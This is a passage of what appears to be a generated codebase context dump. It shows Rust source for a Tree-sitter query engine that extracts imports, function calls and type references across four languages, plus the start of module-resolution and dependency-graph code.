tree_sitter.Node, Node

```rust
//! Tree-sitter query engine for efficient semantic analysis
//!
//! This module provides a declarative query-based approach to semantic analysis
//! using Tree-sitter's query engine, replacing manual AST traversal.

use crate::core::semantic::analyzer::{AnalysisResult, FunctionCall, Import, TypeReference};
use crate::utils::error::ContextCreatorError;
use std::collections::HashMap;
use tree_sitter::{Language, Parser, Query, QueryCursor, Tree};

/// Query engine for semantic analysis using Tree-sitter queries
pub struct QueryEngine {
    #[allow(dead_code)]
    language: Language,
    import_query: Query,
    function_call_query: Query,
    type_reference_query: Query,
}

impl QueryEngine {
    /// Create a new query engine for the specified language
    pub fn new(language: Language, language_name: &str) -> Result<Self, ContextCreatorError> {
        let import_query = Self::create_import_query(language, language_name)?;
        let function_call_query = Self::create_function_call_query(language, language_name)?;
        let type_reference_query = Self::create_type_reference_query(language, language_name)?;

        Ok(Self {
            language,
            import_query,
            function_call_query,
            type_reference_query,
        })
    }

    /// Analyze content using Tree-sitter queries
    pub fn analyze_with_parser(
        &self,
        parser: &mut Parser,
        content: &str,
    ) -> Result<AnalysisResult, ContextCreatorError> {
        // Parse the content
        let tree = parser.parse(content, None).ok_or_else(|| {
            ContextCreatorError::ParseError("Failed to parse content".to_string())
        })?;

        self.analyze_tree(&tree, content)
    }

    /// Analyze a parsed tree using queries
    pub fn analyze_tree(
        &self,
        tree: &Tree,
        content: &str,
    ) -> Result<AnalysisResult, ContextCreatorError> {
        let mut result = AnalysisResult::default();
        let mut query_cursor = QueryCursor::new();
        let root_node = tree.root_node();

        // Execute import query
        let import_matches =
            query_cursor.matches(&self.import_query, root_node, content.as_bytes());
        result.imports = self.extract_imports(import_matches, content)?;

        // Execute function call query
        let call_matches =
            query_cursor.matches(&self.function_call_query, root_node, content.as_bytes());
        result.function_calls = self.extract_function_calls(call_matches, content)?;

        // Execute type reference query
        let type_matches =
            query_cursor.matches(&self.type_reference_query, root_node, content.as_bytes());
        result.type_references = self.extract_type_references(type_matches, content)?;

        Ok(result)
    }

    /// Create import query for the specified language
    fn create_import_query(
        language: Language,
        language_name: &str,
    ) -> Result<Query, ContextCreatorError> {
        let query_text = match language_name {
            "rust" => {
                r#"
                ; Use declarations
                (use_declaration) @import

                ; Module declarations  
                (mod_item
                  name: (identifier) @mod_name
                ) @module

                ; Extern crate declarations
                (extern_crate_declaration
                  name: (identifier) @crate_name
                ) @extern_crate
            "#
            }
            "python" => {
                r#"
                ; Simple import statements (import os, import sys)
                (import_statement
                  (dotted_name) @module_name
                ) @simple_import

                ; From import statements with absolute modules (from pathlib import Path)
                (import_from_statement
                  module_name: (dotted_name) @from_module
                  (dotted_name) @import_item
                ) @from_import
                
                ; From import with aliased imports  
                (import_from_statement
                  module_name: (dotted_name) @from_module
                  (aliased_import
                    name: (dotted_name) @import_item
                  )
                ) @from_import_aliased

                ; Relative from imports (from . import utils, from ..lib import helper)
                (import_from_statement
                  module_name: (relative_import) @relative_module
                  (dotted_name) @import_item
                ) @relative_from_import

                ; Relative from imports with aliased imports
                (import_from_statement
                  module_name: (relative_import) @relative_module
                  (aliased_import
                    name: (dotted_name) @import_item
                  )
                ) @relative_from_import_aliased
            "#
            }
            "javascript" => {
                r#"
                ; Import declarations
                (import_statement
                  (import_clause
                    [
                      (identifier) @import_name
                      (namespace_import (identifier) @import_name)
                      (named_imports
                        (import_specifier
                          [
                            (identifier) @import_name
                            name: (identifier) @import_name
                          ]
                        )
                      )
                    ]
                  )?
                  source: (string) @module_path
                ) @import

                ; Require calls (CommonJS)
                (call_expression
                  function: (identifier) @require_fn (#eq? @require_fn "require")
                  arguments: (arguments (string) @module_path)
                ) @require
            "#
            }
            "typescript" => {
                r#"
                ; Import declarations
                (import_statement
                  (import_clause
                    [
                      (identifier) @import_name
                      (namespace_import (identifier) @import_name)
                      (named_imports
                        (import_specifier
                          [
                            (identifier) @import_name
                            name: (identifier) @import_name
                          ]
                        )
                      )
                    ]
                  )?
                  source: (string) @module_path
                ) @import

                ; Require calls (CommonJS)
                (call_expression
                  function: (identifier) @require_fn (#eq? @require_fn "require")
                  arguments: (arguments (string) @module_path)
                ) @require
            "#
            }
            _ => {
                return Err(ContextCreatorError::ParseError(format!(
                    "Unsupported language for import queries: {language_name}"
                )))
            }
        };

        Query::new(language, query_text).map_err(|e| {
            ContextCreatorError::ParseError(format!("Failed to create import query: {e}"))
        })
    }

    /// Create function call query for the specified language
    fn create_function_call_query(
        language: Language,
        language_name: &str,
    ) -> Result<Query, ContextCreatorError> {
        let query_text = match language_name {
            "rust" => {
                r#"
                ; Simple function calls (helper)
                (call_expression
                  function: (identifier) @fn_name
                ) @call

                ; Scoped function calls (lib::greet)
                (call_expression
                  function: (scoped_identifier
                    path: (identifier) @module_name
                    name: (identifier) @fn_name
                  )
                ) @scoped_call

                ; Nested scoped function calls (lib::User::new)
                (call_expression
                  function: (scoped_identifier
                    path: (scoped_identifier
                      path: (identifier) @module_name
                      name: (identifier) @type_name
                    )
                    name: (identifier) @fn_name
                  )
                ) @nested_scoped_call

                ; Method calls (obj.method())
                (call_expression
                  function: (field_expression
                    field: (field_identifier) @method_name
                  )
                ) @method_call

                ; Macro calls (println!)
                (macro_invocation
                  macro: (identifier) @macro_name
                ) @macro_call
            "#
            }
            "python" => {
                r#"
                ; Simple function calls (print, len)
                (call
                  function: (identifier) @fn_name
                ) @call

                ; Module attribute calls (os.path, module.func)
                (call
                  function: (attribute
                    object: (identifier) @module_name
                    attribute: (identifier) @fn_name
                  )
                ) @module_call

                ; Nested attribute calls (os.path.join)
                (call
                  function: (attribute
                    attribute: (identifier) @fn_name
                  )
                ) @nested_call
            "#
            }
            "javascript" => {
                r#"
                ; Function calls
                (call_expression
                  function: [
                    (identifier) @fn_name
                    (member_expression
                      object: (identifier) @module_name
                      property: (property_identifier) @fn_name
                    )
                  ]
                ) @call
            "#
            }
            "typescript" => {
                r#"
                ; Function calls
                (call_expression
                  function: [
                    (identifier) @fn_name
                    (member_expression
                      object: (identifier) @module_name
                      property: (property_identifier) @fn_name
                    )
                  ]
                ) @call
            "#
            }
            _ => {
                return Err(ContextCreatorError::ParseError(format!(
                    "Unsupported language for function call queries: {language_name}"
                )))
            }
        };

        Query::new(language, query_text).map_err(|e| {
            ContextCreatorError::ParseError(format!("Failed to create function call query: {e}"))
        })
    }

    /// Create type reference query for the specified language
    fn create_type_reference_query(
        language: Language,
        language_name: &str,
    ) -> Result<Query, ContextCreatorError> {
        let query_text = match language_name {
            "rust" => {
                r#"
                ; Type identifiers (excluding definitions)
                (type_identifier) @type_name
                (#not-match? @type_name "^(i8|i16|i32|i64|i128|u8|u16|u32|u64|u128|f32|f64|bool|char|str|String|Vec|Option|Result)$")

                ; Generic types
                (generic_type
                  type: (type_identifier) @type_name
                )

                ; Scoped type identifiers
                (scoped_type_identifier
                  path: (identifier) @module_name
                  name: (type_identifier) @type_name
                )

                ; Types in function parameters
                (parameter
                  type: [
                    (type_identifier) @param_type
                    (generic_type type: (type_identifier) @param_type)
                    (reference_type type: (type_identifier) @param_type)
                  ]
                )

                ; Return types
                (function_item
                  return_type: [
                    (type_identifier) @return_type
                    (generic_type type: (type_identifier) @return_type)
                    (reference_type type: (type_identifier) @return_type)
                  ]
                )

                ; Field types in structs
                (field_declaration
                  type: [
                    (type_identifier) @field_type
                    (generic_type type: (type_identifier) @field_type)
                    (reference_type type: (type_identifier) @field_type)
                  ]
                )

                ; Trait bounds
                (trait_bounds
                  (type_identifier) @trait_name
                )

                ; Types in use statements (traits and types)
                (use_declaration
                  (scoped_identifier
                    name: (identifier) @imported_type
                  )
                )
                (#match? @imported_type "^[A-Z]")
            "#
            }
            "python" => {
                r#"
                ; Type identifiers in type positions
                (type (identifier) @type_name)

                ; Function parameter type annotations 
                (typed_parameter (identifier) @param_type)

                ; Class inheritance 
                (class_definition
                  superclasses: (argument_list (identifier) @parent_class)
                )

                ; Generic/subscript type references
                (subscript (identifier) @subscript_type)
            "#
            }
            "javascript" => {
                r#"
                ; JSX element types (React components)
                (jsx_element
                  open_tag: (jsx_opening_element
                    name: (identifier) @jsx_type
                  )
                )
                (#match? @jsx_type "^[A-Z]")

                ; JSX self-closing elements
                (jsx_self_closing_element
                  name: (identifier) @jsx_type
                )
                (#match? @jsx_type "^[A-Z]")
            "#
            }
            "typescript" => {
                r#"
                ; Type annotations
                (type_annotation
                  (type_identifier) @type_name
                )

                ; Predefined type annotations (void, any, etc.)
                (type_annotation
                  (predefined_type) @type_name
                )

                ; Generic type arguments
                (type_arguments
                  (type_identifier) @type_arg
                )

                ; Interface declarations
                (interface_declaration
                  name: (type_identifier) @interface_name
                )

                ; Type aliases
                (type_alias_declaration
                  name: (type_identifier) @type_alias
                )
            "#
            }
            _ => {
                return Err(ContextCreatorError::ParseError(format!(
                    "Unsupported language for type queries: {language_name}"
                )))
            }
        };

        Query::new(language, query_text).map_err(|e| {
            ContextCreatorError::ParseError(format!("Failed to create type reference query: {e}"))
        })
    }

    /// Extract imports from query matches
    fn extract_imports<'a>(
        &self,
        matches: tree_sitter::QueryMatches<'a, 'a, &'a [u8]>,
        content: &str,
    ) -> Result<Vec<Import>, ContextCreatorError> {
        let mut imports = Vec::new();
        let import_query_captures = self.import_query.capture_names();

        for match_ in matches {
            let mut module = String::new();
            let mut items = Vec::new();
            let mut is_relative = false;
            let mut line = 0;

            for capture in match_.captures {
                let capture_name = &import_query_captures[capture.index as usize];
                let node = capture.node;
                line = node.start_position().row + 1;

                match capture_name.as_str() {
                    "import" => {
                        // Parse Rust use declaration
                        let (parsed_module, parsed_items, is_rel) =
                            self.parse_rust_use_declaration(node, content);
                        module = parsed_module;
                        items = parsed_items;
                        is_relative = is_rel;
                    }
                    "simple_import" => {
                        // Python simple import statement
                    }
                    "from_import" | "from_import_aliased" => {
                        // Python from import statement
                    }
                    "relative_from_import" | "relative_from_import_aliased" => {
                        // Python relative from import statement
                        is_relative = true;
                    }
                    "mod_name" | "crate_name" => {
                        if let Ok(name) = node.utf8_text(content.as_bytes()) {
                            module = name.to_string();
                            is_relative = capture_name == "mod_name";
                        }
                    }
                    "module_name" => {
                        // For Python simple imports and Rust/JS module paths
                        if let Ok(name) = node.utf8_text(content.as_bytes()) {
                            module = name.trim_matches('"').to_string();
                        }
                    }
                    "from_module" => {
                        // For Python from imports
                        if let Ok(name) = node.utf8_text(content.as_bytes()) {
                            module = name.to_string();
                        }
                    }
                    "relative_module" => {
                        // For Python relative imports (. or ..lib)
                        if let Ok(name) = node.utf8_text(content.as_bytes()) {
                            module = name.to_string();
                            is_relative = true;
                        }
                    }
                    "import_name" | "import_item" => {
                        if let Ok(name) = node.utf8_text(content.as_bytes()) {
                            items.push(name.to_string());
                        }
                    }
                    "module_path" => {
                        if let Ok(name) = node.utf8_text(content.as_bytes()) {
                            module = name.trim_matches('"').trim_matches('\'').to_string();
                        }
                    }
                    _ => {}
                }
            }

            if !module.is_empty() || !items.is_empty() {
                imports.push(Import {
                    module,
                    items,
                    is_relative,
                    line,
                });
            }
        }

        Ok(imports)
    }

    /// Extract function calls from query matches
    fn extract_function_calls<'a>(
        &self,
        matches: tree_sitter::QueryMatches<'a, 'a, &'a [u8]>,
        content: &str,
    ) -> Result<Vec<FunctionCall>, ContextCreatorError> {
        let mut calls = Vec::new();
        let call_query_captures = self.function_call_query.capture_names();

        for match_ in matches {
            let mut name = String::new();
            let mut module = None;
            let mut line = 0;
            let mut module_name = String::new();
            let mut type_name = String::new();

            for capture in match_.captures {
                let capture_name = &call_query_captures[capture.index as usize];
                let node = capture.node;
                line = node.start_position().row + 1;

                match capture_name.as_str() {
                    "fn_name" | "method_name" => {
                        if let Ok(fn_name) = node.utf8_text(content.as_bytes()) {
                            name = fn_name.to_string();
                        }
                    }
                    "module_name" => {
                        if let Ok(mod_name) = node.utf8_text(content.as_bytes()) {
                            module_name = mod_name.to_string();
                            module = Some(mod_name.to_string());
                        }
                    }
                    "type_name" => {
                        if let Ok(type_name_str) = node.utf8_text(content.as_bytes()) {
                            type_name = type_name_str.to_string();
                        }
                    }
                    "macro_name" => {
                        if let Ok(macro_name) = node.utf8_text(content.as_bytes()) {
                            name = macro_name.to_string();
                        }
                    }
                    _ => {}
                }
            }

            // Handle nested scoped calls (lib::User::new)
            if !module_name.is_empty() && !type_name.is_empty() {
                module = Some(format!("{module_name}::{type_name}"));
            }

            if !name.is_empty() {
                calls.push(FunctionCall { name, module, line });
            }
        }

        Ok(calls)
    }

    /// Extract type references from query matches
    fn extract_type_references<'a>(
        &self,
        matches: tree_sitter::QueryMatches<'a, 'a, &'a [u8]>,
        content: &str,
    ) -> Result<Vec<TypeReference>, ContextCreatorError> {
        let mut type_refs = Vec::new();
        let type_query_captures = self.type_reference_query.capture_names();

        for match_ in matches {
            let mut names = HashMap::new();
            let mut module = None;
            let mut line = 0;

            for capture in match_.captures {
                let capture_name = &type_query_captures[capture.index as usize];
                let node = capture.node;
                line = node.start_position().row + 1;

                if let Ok(text) = node.utf8_text(content.as_bytes()) {
                    match capture_name.as_str() {
                        "type_name" | "param_type" | "return_type" | "field_type"
                        | "trait_name" | "imported_type" | "interface_name" | "type_alias"
                        | "jsx_type" | "parent_class" | "type_arg" | "base_type"
                        | "subscript_type" => {
                            names.insert(capture_name.to_string(), text.to_string());
                        }
                        "module_name" => {
                            module = Some(text.to_string());
                        }
                        _ => {}
                    }
                }
            }

            // Create type references for each captured type name
            for (_, type_name) in names {
                // Skip built-in types and primitives
                if self.is_builtin_type(&type_name) {
                    continue;
                }

                type_refs.push(TypeReference {
                    name: type_name.clone(),
                    module: module.clone(),
                    line,
                    definition_path: None,
                    is_external: false,
                    external_package: None,
                });
            }
        }

        Ok(type_refs)
    }

    /// Resolve type definitions for type references
    /// This method attempts to find the file that defines each type
    pub fn resolve_type_definitions(
        &self,
        type_refs: &mut [TypeReference],
        current_file: &std::path::Path,
        project_root: &std::path::Path,
    ) -> Result<(), ContextCreatorError> {
        use crate::core::semantic::path_validator::validate_import_path;

        for type_ref in type_refs.iter_mut() {
            // Skip if already resolved or is external
            if type_ref.definition_path.is_some() || type_ref.is_external {
                continue;
            }

            // Try to resolve the type definition
            if let Some(def_path) = self.find_type_definition(
                &type_ref.name,
                type_ref.module.as_deref(),
                current_file,
                project_root,
            )? {
                // Validate the path for security
                match validate_import_path(project_root, &def_path) {
                    Ok(validated_path) => {
                        type_ref.definition_path = Some(validated_path);
                    }
                    Err(_) => {
                        // Path validation failed, mark as external for safety
                        type_ref.is_external = true;
                    }
                }
            }
        }

        Ok(())
    }

    /// Find the definition file for a given type
    fn find_type_definition(
        &self,
        type_name: &str,
        module_name: Option<&str>,
        current_file: &std::path::Path,
        project_root: &std::path::Path,
    ) -> Result<Option<std::path::PathBuf>, ContextCreatorError> {
        use std::fs;

        // Get the directory of the current file
        let current_dir = current_file.parent().unwrap_or(project_root);

        // Convert type name to lowercase for file matching
        let type_name_lower = type_name.to_lowercase();

        // Get file extensions based on current file
        let extensions = self.get_search_extensions(current_file);

        // Build search patterns
        let mut patterns = vec![
            // Direct file name matches
            format!("{type_name_lower}.{}", extensions[0]),
            // Types files
            format!("types.{}", extensions[0]),
            // Module files
            format!("mod.{}", extensions[0]),
            format!("index.{}", extensions[0]),
            // Common type definition patterns
            format!("{type_name_lower}_types.{}", extensions[0]),
            format!("{type_name_lower}_type.{}", extensions[0]),
            format!("{type_name_lower}s.{}", extensions[0]), // plural form
        ];

        // Add patterns for all supported extensions
        for ext in &extensions[1..] {
            patterns.push(format!("{type_name_lower}.{ext}"));
            patterns.push(format!("types.{ext}"));
            patterns.push(format!("index.{ext}"));
        }

        // If we have a module name, add module-based patterns
        if let Some(module) = module_name {
            // Handle Rust module paths like "crate::models::User"
            if module.starts_with("crate::") {
                let relative_path = module.strip_prefix("crate::").unwrap();
                let path_parts: Vec<&str> = relative_path.split("::").collect();

                if path_parts.len() > 1 {
                    // Convert module path to file path
                    // crate::models::User -> models/user.rs
                    let module_path = path_parts[..path_parts.len() - 1].join("/");
                    let type_name_lower = path_parts.last().unwrap().to_lowercase();

                    for ext in &extensions {
                        patterns.insert(0, format!("{module_path}/{type_name_lower}.{ext}"));
                        patterns.insert(1, format!("{module_path}/mod.{ext}"));
                    }
                }
            } else if module.contains("::") {
                // Handle other module paths like "shared::types::ApiResponse"
                let path_parts: Vec<&str> = module.split("::").collect();

                if path_parts.len() > 1 {
                    // Convert module path to file path
                    // shared::types::ApiResponse -> shared/types/mod.rs
                    let module_path = path_parts[..path_parts.len() - 1].join("/");
                    let type_name_lower = path_parts.last().unwrap().to_lowercase();

                    for ext in &extensions {
                        patterns.insert(0, format!("{module_path}/{type_name_lower}.{ext}"));
                        patterns.insert(1, format!("{module_path}/mod.{ext}"));
                    }
                }
            } else {
                // Handle simple module names
                let module_lower = module.to_lowercase();
                for ext in &extensions {
                    patterns.insert(0, format!("{module_lower}.{ext}"));
                    patterns.insert(1, format!("{module}.{ext}")); // Also try original case
                }
            }
        }

        // Search directories in priority order
        let mut search_dirs = vec![
            project_root.join("src"), // Start with project root src for crate:: paths
            project_root.to_path_buf(),
            current_dir.to_path_buf(),
        ];

        // Add parent directory if it exists
        if let Some(parent_dir) = current_dir.parent() {
            search_dirs.push(parent_dir.to_path_buf());
        }

        // Add common project directories
        search_dirs.extend(vec![
            project_root.join("src/models"),
            project_root.join("src/types"),
            project_root.join("shared"),
            project_root.join("shared/types"),
            project_root.join("lib"),
            project_root.join("domain"),
            current_dir.join("models"),
            current_dir.join("types"),
        ]);

        for search_dir in search_dirs {
            if !search_dir.exists() {
                continue;
            }

            for pattern in &patterns {
                let candidate = search_dir.join(pattern);
                if candidate.exists() {
                    // Read the file to verify it contains the type definition
                    if let Ok(content) = fs::read_to_string(&candidate) {
                        if self.file_contains_definition(&candidate, &content, type_name)? {
                            return Ok(Some(candidate));
                        }
                    }
                }
            }
        }

        Ok(None)
    }

    /// Check if a file contains a definition for a given type name using AST parsing
    fn file_contains_definition(
        &self,
        path: &std::path::Path,
        content: &str,
        type_name: &str,
    ) -> Result<bool, ContextCreatorError> {
        // Determine the language from the file extension
        let language = match path.extension().and_then(|s| s.to_str()) {
            Some("rs") => Some(tree_sitter_rust::language()),
            Some("py") => Some(tree_sitter_python::language()),
            Some("ts") | Some("tsx") => Some(tree_sitter_typescript::language_typescript()),
            Some("js") | Some("jsx") => Some(tree_sitter_javascript::language()),
            _ => None,
        };

        if let Some(language) = language {
            let mut parser = tree_sitter::Parser::new();
            if parser.set_language(language).is_err() {
                return Ok(false);
            }

            if let Some(tree) = parser.parse(content, None) {
                // Language-specific queries for type definitions
                let query_text = match path.extension().and_then(|s| s.to_str()) {
                    Some("rs") => {
                        r#"
                        [
                          (struct_item name: (type_identifier) @name)
                          (enum_item name: (type_identifier) @name)
                          (trait_item name: (type_identifier) @name)
                          (type_item name: (type_identifier) @name)
                          (union_item name: (type_identifier) @name)
                        ]
                    "#
                    }
                    Some("py") => {
                        r#"
                        [
                          (class_definition name: (identifier) @name)
                          (function_definition name: (identifier) @name)
                        ]
                    "#
                    }
                    Some("ts") | Some("tsx") => {
                        r#"
                        [
                          (interface_declaration name: (type_identifier) @name)
                          (type_alias_declaration name: (type_identifier) @name)
                          (class_declaration name: (type_identifier) @name)
                          (enum_declaration name: (identifier) @name)
                        ]
                    "#
                    }
                    Some("js") | Some("jsx") => {
                        r#"
                        [
                          (class_declaration name: (identifier) @name)
                          (function_declaration name: (identifier) @name)
                        ]
                    "#
                    }
                    _ => return Ok(false),
                };

                if let Ok(query) = tree_sitter::Query::new(language, query_text) {
                    let mut cursor = tree_sitter::QueryCursor::new();
                    let matches = cursor.matches(&query, tree.root_node(), content.as_bytes());

                    // Check each match to see if the captured name matches our target type
                    for m in matches {
                        for capture in m.captures {
                            if let Ok(captured_text) = capture.node.utf8_text(content.as_bytes()) {
                                if captured_text == type_name {
                                    return Ok(true);
                                }
                            }
                        }
                    }
                }
            }
        }

        Ok(false)
    }

    /// Get appropriate file extensions for searching based on current file
    fn get_search_extensions(&self, current_file: &std::path::Path) -> Vec<&'static str> {
        match current_file.extension().and_then(|s| s.to_str()) {
            Some("rs") => vec!["rs"],
            Some("py") => vec!["py"],
            Some("ts") | Some("tsx") => vec!["ts", "tsx", "js", "jsx"],
            Some("js") | Some("jsx") => vec!["js", "jsx", "ts", "tsx"],
            _ => vec!["rs", "py", "ts", "js"], // Default fallback
        }
    }

    /// Parse Rust use tree structure
    #[allow(dead_code)]
    fn parse_rust_use_tree(
        &self,
        node: tree_sitter::Node,
        content: &str,
    ) -> (String, Vec<String>, bool) {
        // Implementation would recursively parse the use tree structure
        // For now, simplified implementation
        if let Ok(text) = node.utf8_text(content.as_bytes()) {
            let is_relative =
                text.contains("self::") || text.contains("super::") || text.contains("crate::");
            (text.to_string(), Vec::new(), is_relative)
        } else {
            (String::new(), Vec::new(), false)
        }
    }

    /// Parse Rust use declaration structure
    fn parse_rust_use_declaration(
        &self,
        node: tree_sitter::Node,
        content: &str,
    ) -> (String, Vec<String>, bool) {
        // Parse the entire use declaration
        if let Ok(text) = node.utf8_text(content.as_bytes()) {
            // Extract module path and imported items from use declaration
            // Example: "use model::{Account, DatabaseFactory, Rule};"
            let clean_text = text
                .trim()
                .trim_start_matches("use ")
                .trim_end_matches(';')
                .trim();

            let is_relative = clean_text.contains("self::")
                || clean_text.contains("super::")
                || clean_text.contains("crate::");

            if clean_text.contains('{') && clean_text.contains('}') {
                // Handle scoped imports like "model::{Account, DatabaseFactory}"
                if let Some(colon_pos) = clean_text.find("::") {
                    let module = clean_text[..colon_pos].to_string();

                    // Extract items from braces
                    if let Some(start) = clean_text.find('{') {
                        if let Some(end) = clean_text.find('}') {
                            let items_str = &clean_text[start + 1..end];
                            let items: Vec<String> = items_str
                                .split(',')
                                .map(|s| s.trim().to_string())
                                .filter(|s| !s.is_empty())
                                .collect();
                            return (module, items, is_relative);
                        }
                    }
                }
            } else {
                // Handle simple imports like "use std::collections::HashMap;"
                return (clean_text.to_string(), Vec::new(), is_relative);
            }

            (clean_text.to_string(), Vec::new(), is_relative)
        } else {
            (String::new(), Vec::new(), false)
        }
    }

    /// Check if a type name is a built-in type
    fn is_builtin_type(&self, type_name: &str) -> bool {
        matches!(
            type_name,
            "i8" | "i16"
                | "i32"
                | "i64"
                | "i128"
                | "u8"
                | "u16"
                | "u32"
                | "u64"
                | "u128"
                | "f32"
                | "f64"
                | "bool"
                | "char"
                | "str"
                | "String"
                | "Vec"
                | "Option"
                | "Result"
                | "Box"
                | "Rc"
                | "Arc"
                | "HashMap"
                | "HashSet"
                | "number"
                | "string"
                | "boolean"
                | "object"
                | "int"
                | "float"
                | "list"
                | "dict"
                | "tuple"
                | "set"
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rust_query_creation() {
        let engine = QueryEngine::new(tree_sitter_rust::language(), "rust");
        assert!(engine.is_ok());
    }

    #[test]
    fn test_python_query_creation() {
        let engine = QueryEngine::new(tree_sitter_python::language(), "python");
        if let Err(e) = &engine {
            println!("Python QueryEngine error: {e}");
        }
        assert!(engine.is_ok());
    }

    #[test]
    fn test_javascript_query_creation() {
        let engine = QueryEngine::new(tree_sitter_javascript::language(), "javascript");
        if let Err(e) = &engine {
            println!("JavaScript QueryEngine error: {e}");
        }
        assert!(engine.is_ok());
    }

    #[test]
    fn test_typescript_query_creation() {
        let engine = QueryEngine::new(tree_sitter_typescript::language_typescript(), "typescript");
        if let Err(e) = &engine {
            println!("TypeScript QueryEngine error: {e}");
        }
        assert!(engine.is_ok());
    }

    #[test]
    fn test_builtin_type_detection() {
        let engine = QueryEngine::new(tree_sitter_rust::language(), "rust").unwrap();

        assert!(engine.is_builtin_type("String"));
        assert!(engine.is_builtin_type("Vec"));
        assert!(engine.is_builtin_type("i32"));
        assert!(!engine.is_builtin_type("MyCustomType"));
    }
}
```

## src/core/semantic/resolver.rs

Imports: crate::utils::error::ContextCreatorError, std

Type references: crate::utils::error::ContextCreatorError.ContextCreatorError, ResolvedPath, std.PathBuf, std.PathBuf, ModuleResolver, Send, Send, Sync, Sync, std.Path, std.Path, std.Path, std.Path, ResolvedPath, crate::utils::error::ContextCreatorError.ContextCreatorError, ResolverUtils, ResolverUtils, std.Path, std.Path, std.PathBuf, std.PathBuf, std.PathBuf, std.Path, std.Path, std.PathBuf, std.Path, std.Path, std.Path, std.Path

```rust
//! Module resolution for converting import strings to file paths

use crate::utils::error::ContextCreatorError;
use std::path::{Path, PathBuf};

/// A resolved module path
#[derive(Debug, Clone, PartialEq)]
pub struct ResolvedPath {
    /// The resolved file path
    pub path: PathBuf,
    /// Whether this is a third-party module (not in project)
    pub is_external: bool,
    /// Confidence in the resolution (0.0 to 1.0)
    pub confidence: f32,
}

/// Trait for language-specific module resolution
pub trait ModuleResolver: Send + Sync {
    /// Resolve a module import to a file path
    fn resolve_import(
        &self,
        module_path: &str,
        from_file: &Path,
        base_dir: &Path,
    ) -> Result<ResolvedPath, ContextCreatorError>;

    /// Get common file extensions for this language
    fn get_file_extensions(&self) -> Vec<&'static str>;

    /// Check if a module is likely external/third-party
    fn is_external_module(&self, module_path: &str) -> bool {
        // Default heuristics - languages can override
        module_path.starts_with('@') || // npm scoped packages
        !module_path.starts_with('.') || // relative imports usually start with .
        module_path.contains("node_modules") ||
        module_path.contains("site-packages") ||
        module_path.contains("vendor")
    }
}

/// Common module resolution utilities
pub struct ResolverUtils;

impl ResolverUtils {
    /// Try to find a file with different extensions
    pub fn find_with_extensions(base_path: &Path, extensions: &[&str]) -> Option<PathBuf> {
        // Try exact path first
        if base_path.exists() && base_path.is_file() {
            return Some(base_path.to_path_buf());
        }

        // Try with each extension
        for ext in extensions {
            let with_ext = base_path.with_extension(ext);
            if with_ext.exists() && with_ext.is_file() {
                return Some(with_ext);
            }
        }

        // Try as directory with index file
        if base_path.exists() && base_path.is_dir() {
            for index_name in &["index", "mod", "__init__"] {
                for ext in extensions {
                    let index_path = base_path.join(format!("{index_name}.{ext}"));
                    if index_path.exists() && index_path.is_file() {
                        return Some(index_path);
                    }
                }
            }
        }

        None
    }

    /// Convert module path separators to file path separators
    pub fn module_to_path(module_path: &str) -> PathBuf {
        PathBuf::from(module_path.replace('.', "/").replace("::", "/"))
    }

    /// Resolve a relative import path
    pub fn resolve_relative(
        import_path: &str,
        from_file: &Path,
        extensions: &[&str],
    ) -> Option<PathBuf> {
        let from_dir = from_file.parent()?;

        // Handle different relative import styles
        let clean_path = import_path
            .trim_start_matches("./")
            .trim_start_matches("../");

        let mut current_dir = from_dir.to_path_buf();

        // Count leading ../ to go up directories
        let up_count = import_path.matches("../").count();
        for _ in 0..up_count {
            current_dir = current_dir.parent()?.to_path_buf();
        }

        let target = current_dir.join(clean_path);
        Self::find_with_extensions(&target, extensions)
    }

    /// Check if a path is within the project directory
    pub fn is_within_project(path: &Path, base_dir: &Path) -> bool {
        path.canonicalize()
            .ok()
            .and_then(|p| base_dir.canonicalize().ok().map(|b| p.starts_with(b)))
            .unwrap_or(false)
    }
}
```

## src/core/semantic_graph.rs

Imports: crate::core::cache::FileCache, crate, crate::core::walker::FileInfo, anyhow::Result, std, config

Type references: crate::core::cache::FileCache.FileCache, crate::core::walker::FileInfo.FileInfo, DependencyNode, std.PathBuf, std.PathBuf, FunctionCall, TypeReference, crate::core::walker::FileInfo.FileInfo, Config, crate::core::cache::FileCache.FileCache, crate::core::cache::FileCache.FileCache, DependencyGraph, DependencyNode, std.PathBuf, std.PathBuf, crate::core::cache::FileCache.FileCache, crate::core::cache::FileCache.FileCache, std.PathBuf, std.PathBuf, DependencyGraph, DependencyGraph, crate::core::walker::FileInfo.FileInfo, crate.SemanticOptions, crate.SemanticOptions, crate::core::cache::FileCache.FileCache, crate::core::cache::FileCache.FileCache, Self, DependencyNode, Self, std.Path, std.Path, std.PathBuf, std.PathBuf, crate.SemanticOptions, crate.SemanticOptions, crate.SemanticOptions, crate.SemanticOptions, std.Path, std.Path, std.PathBuf, crate::core::walker::FileInfo.FileInfo, std.PathBuf, crate::core::walker::FileInfo.FileInfo, crate::core::walker::FileInfo.FileInfo, std.PathBuf

```rust
//! Dependency graph traversal for semantic analysis

use crate::core::cache::FileCache;
use crate::core::semantic::{analyzer::SemanticContext, SemanticOptions};
use crate::core::walker::FileInfo;
use anyhow::Result;
use std::collections::{HashMap, HashSet, VecDeque};
use std::path::{Path, PathBuf};

/// Represents a node in the dependency graph
#[derive(Debug, Clone)]
struct DependencyNode {
    file_index: usize,
    depth: usize,
    imports: Vec<PathBuf>,
    #[allow(dead_code)]
    imported_by: Vec<PathBuf>,
    function_calls: Vec<crate::core::semantic::analyzer::FunctionCall>,
    type_references: Vec<crate::core::semantic::analyzer::TypeReference>,
}

/// Performs sophisticated semantic analysis with proper dependency graph traversal
pub fn perform_semantic_analysis_graph(
    files: &mut [FileInfo],
    config: &crate::cli::Config,
    cache: &FileCache,
) -> Result<()> {
    // Skip if no semantic analysis is requested
    if !config.trace_imports && !config.include_callers && !config.include_types {
        return Ok(());
    }

    let semantic_options = SemanticOptions::from_config(config);

    // Build initial dependency graph
    let mut graph = DependencyGraph::new(files, &semantic_options, cache)?;

    // Perform breadth-first traversal up to semantic_depth
    graph.traverse_dependencies(&semantic_options)?;

    // Apply the discovered dependencies back to the files
    graph.apply_to_files(files);

    Ok(())
}

/// Dependency graph for semantic analysis
struct DependencyGraph<'a> {
    nodes: Vec<DependencyNode>,
    path_to_index: HashMap<PathBuf, usize>,
    index_to_path: HashMap<usize, PathBuf>,
    visited: HashSet<usize>,
    cache: &'a FileCache,
    project_root: PathBuf,
}

impl<'a> DependencyGraph<'a> {
    /// Create a new dependency graph from the initial set of files
